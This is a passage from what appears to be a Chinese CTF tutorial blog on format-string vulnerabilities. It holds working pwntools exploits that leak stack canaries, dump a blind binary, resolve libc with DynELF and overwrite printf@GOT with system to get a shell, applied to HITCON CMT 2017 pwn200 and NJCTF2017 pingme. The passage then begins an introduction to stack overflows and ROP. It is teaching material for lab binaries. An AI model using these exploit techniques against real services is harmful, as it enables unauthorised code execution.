<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(str, <span class="string">&#x27;\0&#x27;</span>, <span class="number">1024</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, str, <span class="number">1024</span>);</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"><span class="comment">// gcc -m32 -fno-stack-protector -no-pie 2.c -o a.out -g</span></span><br></pre></td></tr></table></figure>
<p>&emsp;存在格式化字符串漏洞，思路是将 printf 函数的地址改成 system 函数的地址，当再次输入 <code>/bin/sh</code> 时，就可以获得 shell。</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519145717935.png" alt="image-20240519145717935" style="zoom:80%;" /></p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519145953049.png" alt="image-20240519145953049" style="zoom:67%;" /></p>
<p>&emsp;可以构造以下 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fmt exp code</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line">offset = auto.offset</span><br><span class="line"><span class="comment"># offset is 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get printf virtual address</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = p32(printf_got) + <span class="string">b&#x27;%4$s&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get system virtual address</span></span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line">printf_addr = u32(io.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">system_addr = priintf_addr - (libc.symbols[<span class="string">&#x27;printf&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">log.info(<span class="string">&quot;system_addr =&gt; %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change printf got</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got:system_addr&#125;)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;其中 pwntools 中 FmtStr 与 fmtstr_payload 的使用如下：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519153316679.png" alt="image-20240519153316679" style="zoom:80%;" /></p>
<h3 id="例题1：HITCON-CMT-2017-pwn200"><a href="#例题1：HITCON-CMT-2017-pwn200" class="headerlink" title="例题1：HITCON CMT 2017 pwn200"></a>例题1：HITCON CMT 2017 pwn200</h3><p>&emsp;此题为 32 位，且开启 partial RELRO、canary 与 NX，其源码为：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519153511283.png" alt="image-20240519153511283" style="zoom:67%;" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z lazy -z -fstack-protector -z exestack -no-pie -fno-pie 3.c -o a.out -g</span><br></pre></td></tr></table></figure>
<p>&emsp;其中 gets 有缓冲区溢出漏洞，printf 有格式化字符串漏洞。思路：<code>格式化字符串泄露 Canary 值，并在栈溢出时填充上去，从而覆盖返回地址，跳转到 canary_protect_me 函数获得 shell</code>。</p>
<p>Step1：为了泄露 Canary 的值，需要先知道它保存在栈的哪个位置。在 main 函数开头下断，可以发现：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519160249561.png" alt="image-20240519160249561" style="zoom:67%;" /></p>
<p>&emsp;在 main+27 与 printf 下断，发现 canary 值为 0xf708d000，且偏移为 15 的位置。因此可以使用格式字符串 <code>%15$x</code> 来泄露 canary 的值。</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519161418374.png" alt="image-20240519161418374" style="zoom:80%;" /></p>
<p>Step2：而第二个 get 与 canary 之间的距离为 0x28，与返回地址之间的距离为 0x48（图中有误），并且要注意 0xffffd554 处（用偏移 %17$x）的值，这个值不能发生改变。</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519171519306.png" alt="image-20240519171519306" style="zoom:67%;" /></p>
<p>Step3：可以写 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;%15$x%17$x&quot;</span>)</span><br><span class="line">rec = io.recv()</span><br><span class="line">canary = <span class="built_in">int</span>(rec[:<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">hit = <span class="built_in">int</span>(rec[<span class="number">8</span>:], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;canary 0x%x | hit 0x%x&quot;</span> % (canary, hit))</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x08049216</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p32(canary) + <span class="string">b&quot;A&quot;</span>*<span class="number">4</span> + p32(hit) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x14</span> + p32(binsh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="例题2：NJCTF2017：pingme"><a href="#例题2：NJCTF2017：pingme" class="headerlink" title="例题2：NJCTF2017：pingme"></a>例题2：NJCTF2017：pingme</h3><p>&emsp;32 位，只开了堆栈不可执行。但是当时的题目没给二进制文件（没有给 pingme 文件），只暴露了端口。</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519190659510.png" alt="image-20240519190659510" style="zoom:67%;" /></p>
<p>Step1：启动题目环境（IP：127.0.0.1 PORT：10001）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &amp;</span><br></pre></td></tr></table></figure>
<p>&emsp;启动一个监听在 TCP 端口 10001 上的服务器，每当有新的连接进来时，它会 fork 一个新进程并执行 <code>./pingme</code> 程序来处理该连接。<code>socat</code> 工具在这里充当了一个简单的网络服务器和进程管理器。<code>reuseaddr</code> 选项确保可以立即重新启动监听器，<code>fork</code> 选项确保可以处理多个并发连接，<code>exec</code> 选项确保每个连接都会启动 <code>pingme</code> 程序来处理。</p>
<p>Step2：测试是否有格式化字符串的洞。可以使用 FmtStr：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    info = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;END&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> info:</span><br><span class="line">        info += <span class="string">b&quot;END&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;START&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> info:</span><br><span class="line">        info = <span class="string">b&quot;START&quot;</span> + info</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;recv <span class="subst">&#123;info&#125;</span>\n\nsend <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line">offset = auto.offset</span><br><span class="line"><span class="built_in">print</span>(offset)</span><br><span class="line"><span class="comment"># 可以发现偏移为 7</span></span><br></pre></td></tr></table></figure>
<p>Step3：使用此漏洞可以 dump 出 bin 文件（其中 start_addr 也可以由格式化字符串漏洞探测得到，32 位 ELF 开头 4 个字节为 b’\x7fELF’）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_start_addr</span>():</span><br><span class="line">    range_min = <span class="number">0x80000000</span></span><br><span class="line">    range_max = <span class="number">0x90000000</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    feature_code = <span class="string">b&#x27;\x7fELF\x01\x01\x01&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> range_min + i &lt; range_max:</span><br><span class="line">        io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;10001&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;Ping me\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = p32(range_min + i) + <span class="string">b&quot;AAA.%7$s.AAA&quot;</span></span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        data = io.recvuntil(<span class="string">b&quot;.AAA&quot;</span>)[<span class="number">8</span>:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> data == feature_code:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;success: <span class="subst">&#123;data&#125;</span> <span class="subst">&#123;range_min+i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;fail: <span class="subst">&#123;data&#125;</span> <span class="subst">&#123;range_min+i&#125;</span>&quot;</span>)</span><br><span class="line">        i += <span class="number">4</span></span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">return</span> range_min+i</span><br><span class="line"></span><br><span class="line">get_start_addr()</span><br></pre></td></tr></table></figure>
<p>&emsp;试了试上述程序，只会返回<code>:(</code>，调研后发现，地址在前面的话，会导致第一个字节为 \x00，从而导致 strlen 返回为 0，因此，地址应该放到后面。测试后发现，不仅仅使用<code>AAAA%7$x</code>可以，使用<code>%9$xAAAABBBB</code>也可以：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519215705580.png" alt="image-20240519215705580" style="zoom:80%;" /></p>
<p>&emsp;因此，修改上述的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_start_addr</span>():</span><br><span class="line">    range_min = <span class="number">0x8000000</span></span><br><span class="line">    range_max = <span class="number">0x9000000</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    feature_code = <span class="string">b&#x27;\x7fELF\x01\x01\x01&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> range_min + i &lt; range_max:</span><br><span class="line">        io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;10001&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;Ping me\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&quot;%9$s.AAA&quot;</span> + p32(range_min + i)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        data = io.recvuntil(<span class="string">b&quot;.AAA&quot;</span>)[:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> data == feature_code:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;success: <span class="subst">&#123;feature_code&#125;</span> <span class="subst">&#123;range_min+i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;fail: <span class="subst">&#123;feature_code&#125;</span> <span class="subst">&#123;range_min+i&#125;</span>&quot;</span>)</span><br><span class="line">        i += <span class="number">4</span></span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">return</span> range_min+i</span><br><span class="line"></span><br><span class="line">get_start_addr()</span><br><span class="line"><span class="comment"># success: b&#x27;\x7fELF\x01\x01\x01&#x27; 134512640 =&gt; 0x8048000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x8048000</span></span><br><span class="line">dump_len = <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_mem</span>(<span class="params">start_addr, dump_len</span>):</span><br><span class="line">    result = <span class="string">b&quot;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; dump_len:</span><br><span class="line">        io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;10001&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;Ping me\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&quot;%9$s.AAA&quot;</span> + p32(start_addr + i)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        data = io.recvuntil(<span class="string">b&quot;.AAA&quot;</span>)[:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>:</span><br><span class="line">            data = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">        result += data</span><br><span class="line">        i += <span class="built_in">len</span>(data)</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">code = dump_mem(start_addr, dump_len)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;code.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code)</span><br></pre></td></tr></table></figure>
<p>&emsp;最终得到的 code.bin 与真实的仍有差别，不知道什么情况：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519230232117.png" alt="image-20240519230232117" style="zoom:67%;" /></p>
<p>Step4：该题目前成为了有二进制文件（code.bin）而无 libc 的题。首先拿到 printf 的 GOT 地址：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240522203446321.png" alt="image-20240522203446321" style="zoom:67%;" /></p>
<p>&emsp;之后考虑泄露 printf 的内存地址，这里根据是否可以拿到 libc.so 分为两种情况：</p>
<ul>
<li>能拿到 libc.so（能访问到 libc.so）：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">printf_got = <span class="number">0x08049974</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_printf_addr</span>():</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;10001&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Ping me\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;%9$s.AAA&quot;</span> + p32(printf_got)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    data = u32(io.recvuntil(<span class="string">b&quot;.AAA&quot;</span>)[:<span class="number">4</span>])</span><br><span class="line">    log.info(<span class="string">&quot;printf address: 0x%x&quot;</span> % data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">get_printf_addr()</span><br><span class="line"><span class="comment"># b&#x27;\xb0b\xe1\xf7\x80\x1d\xe3\xf7\xf0\xf0\xe8\xf7@&lt;\xe3\xf7pV\xe6\xf7\x10F\xe5\xf7\xe0\r\xde\xf7v\x84\x04\x08&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>不能拿到 libc.so 的时候，可以使用 DynELF 模块，其原理是：<code>利用程序的任意读取原语，通过解析程序中的动态链接器数据结构（如 GOT、PLT、.dynamic 段等），自动化地查找和泄露函数地址。</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;10001&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Ping me\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = <span class="string">b&quot;%9$s.AAA&quot;</span> + p32(addr)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        data = io.recvuntil(<span class="string">b&quot;.AAA&quot;</span>)[:-<span class="number">4</span>] + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        data = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x08048490 是入口地址</span></span><br><span class="line">data = DynELF(leak, <span class="number">0x08048490</span>)</span><br><span class="line"><span class="comment"># &#x27;system&#x27; 为要查找的符号名，&#x27;libc&#x27; 是动态库的名称</span></span><br><span class="line">system_addr = data.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>Step5：利用格式化字符串的任意写将 printf@got 地址的内存覆盖为 system 的地址然后发送字符串 “/bin/sh”，即可在调用 printf(“/bin/sh”) 的时候实际上调用 system(“/bin/sh”)。使用 fmtstr_payload 函数可以构造 payload，举个例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got: system_addr&#125;)</span><br></pre></td></tr></table></figure>
<p><img src="/images/ctf-guide-pwn-2/image-20240522214441689.png" alt="image-20240522214441689" style="zoom:67%;" /></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;10001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x08049974</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method_1</span>(<span class="params">io</span>):</span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> system_addr</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_printf_addr</span>():</span><br><span class="line">        io.recvline()</span><br><span class="line">        payload = <span class="string">b&quot;%9$s.AAA&quot;</span> + p32(printf_got)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        data = u32(io.recvuntil(<span class="string">b&quot;.AAA&quot;</span>)[:<span class="number">4</span>])</span><br><span class="line">        log.info(<span class="string">&quot;printf addr: 0x%x&quot;</span> % data)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">    printf_addr = get_printf_addr()</span><br><span class="line">    system_addr = printf_addr - (libc.sym[<span class="string">&#x27;printf&#x27;</span>] - libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    log.info(<span class="string">&quot;system addr: 0x%x&quot;</span> % system_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method_2</span>(<span class="params">io</span>):</span><br><span class="line">    <span class="keyword">global</span> system_addr</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">        io.recvline()</span><br><span class="line">        payload = <span class="string">b&quot;%9$s.AAA&quot;</span> + p32(addr)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        data = io.recvuntil(<span class="string">b&quot;.AAA&quot;</span>)[:-<span class="number">4</span>] + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">        log.info(<span class="string">&quot;leak: %s&quot;</span> % data)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">    data = DynELF(leak, <span class="number">0x08048490</span>)</span><br><span class="line">    system_addr = data.lookup(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;libc&quot;</span>)</span><br><span class="line">    printf_addr = data.lookup(<span class="string">&quot;printf&quot;</span>, <span class="string">&quot;libc&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;system addr: 0x%x&quot;</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;printf addr: 0x%x&quot;</span> % printf_addr)  </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># leak system_addr</span></span><br><span class="line">    method_1(io)</span><br><span class="line">    <span class="comment"># method_2(io)</span></span><br><span class="line">    </span><br><span class="line">    payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got: system_addr&#125;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="comment"># change printf_addr to system_addr</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
<h2 id="0x07-栈溢出与-ROP"><a href="#0x07-栈溢出与-ROP" class="headerlink" title="0x07 栈溢出与 ROP"></a>0x07 栈溢出与 ROP</h2><p>&emsp;根据溢出发生的内存位置，通常可以分为栈溢出和堆溢出。其中，由于栈上保存着局部变量和一些状态信息（寄存器值、返回地址等），一旦溢出，攻击者就可以通过覆写返回地址来执行任意代码，利用方法包括 shellcode 注入、ret2libc、ROP 等。</p>
<p>&emsp;函数调用栈是一块连续的用来保存函数运行状态的内存区域，调用函数和被调用函数根据调用关系堆叠起来，从内存的高地址向低地址增长。对 x86 与 x86-64 的调用栈举例：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240522231811645.png" alt="image-20240522231811645" style="zoom: 80%;" /></p>
<p><img src="/images/ctf-guide-pwn-2/image-20240522231918244.png" alt="image-20240522231918244" style="zoom:80%;" /></p>
<p>&emsp;首先看 x86 的调用栈：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240522232551665.png" alt="image-20240522232551665" style="zoom:80%;" /></p>
<p>&emsp;再看 x64 的调用栈：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240524205727195.png" alt="image-20240524205727195" style="zoom:67%;" /></p>
<p>&emsp;没有 <code>sub rsp, xxx</code> 的原因是 rsp 以下 128 字节的区域为 red zone，不会被信号或者中断所修改，于是直接可以用这段内存保存数据。使用 <code>-fomit-frame-pointer</code> 可以省略 rbp，从而减少指令数量。</p>
<p>&emsp;大多数缓冲区溢出问题与危险函数相关，包括 scanf、gets等输入函数。使用的时候，比如限制输入长度为10，那么应该：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%9s&quot;</span>, buf);</span><br></pre></td></tr></table></figure>
